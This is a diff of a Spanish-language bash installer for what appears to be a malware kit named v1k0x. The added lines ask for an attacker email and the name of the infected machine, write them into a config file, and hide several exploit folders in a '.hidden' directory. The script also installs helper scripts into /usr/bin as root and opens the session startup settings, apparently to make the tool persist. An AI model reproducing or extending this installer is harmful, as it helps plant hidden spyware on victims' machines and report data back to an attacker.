@@ -1,3 +1,5 @@
+#!/bin/bash
+
 root_verify=$(whoami)
 usuario=$(users)
 
@@ -17,14 +19,28 @@ function init_program() {
     sudo chmod +x /usr/bin/chisec.sh
     sudo chmod +x /usr/bin/fingerstalker.sh
 
+    echo -e "Email Atacante >> "
+    read email
+    echo -e "Nombre de maquina infectada >> "
+    read machine
+    
+    echo "$email|$machine|$usuario" > exploits/config.txt
+
     # Carpetas
-    mkdir .hidden
-    mv -r exploits/0v53rber/ .hidden
-    mv -r exploits/ch1sec/ .hidden
-    mv -r exploits/f1ng3r5talk3r/ .hidden
+    mkdir ../.hidden
+    mv exploits/config.txt ../.hidden
+    mv exploits/0v53rber/ ../.hidden
+    mv exploits/ch1s3c/ ../.hidden
+    mv exploits/f1ng3r5talk3r/ ../.hidden
+
+    cp ../.hidden/config.txt ../.hidden/0v53rber
+    cp ../.hidden/config.txt ../.hidden/ch1s3c
+    cp ../.hidden/config.txt ../.hidden/f1ng3r5talk3r
+    
+    clear
 
     echo -e "En otra terminal pega el siguiente comando : python3.7 /home/$usuario/v1k0x/add.py"
-
+    mate-session-properties
     echo -e "[+] Instalacion completada con exito. "
 }
 if [ $root_verify != "root" ]
@@ -32,3 +48,4 @@ then
     echo -e "[!] Debes ejecutar el instalador como root (super-usuario)"
 else
     init_program
+fi
